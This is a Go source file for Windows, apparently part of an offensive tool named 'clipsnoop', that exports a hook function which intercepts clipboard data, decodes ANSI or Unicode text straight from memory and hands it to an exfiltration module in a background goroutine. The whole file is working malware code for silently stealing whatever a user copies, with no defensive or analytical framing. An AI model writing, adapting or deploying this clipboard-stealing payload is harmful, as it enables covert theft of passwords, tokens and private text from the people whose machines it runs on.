//go:build windows
// +build windows

package main

import "C"
import (
	"unsafe"

	"github.com/stavinski/clipsnoop/exfil"
	"golang.org/x/sys/windows"
)

const (
	CF_TEXT    = 1
	CF_UNICODE = 13
)

// exfil clipboard text
func exfilClipText(content string) {
	exfil.Exfil.Write(content)
}

//export goClipboardPayload
func goClipboardPayload(uFormat uint32, hMem uintptr) {
	// only intestered in text formats
	if uFormat != CF_TEXT && uFormat != CF_UNICODE {
		return
	}
	ptrData := *(*uintptr)(unsafe.Pointer(hMem))
	content := ""
	if uFormat == CF_TEXT {
		content = windows.BytePtrToString((*byte)(unsafe.Pointer(ptrData)))
	} else {
		content = windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptrData)))
	}
	// perform this in a separate goroutine to not block the call with I/O
	go exfilClipText(content)
}
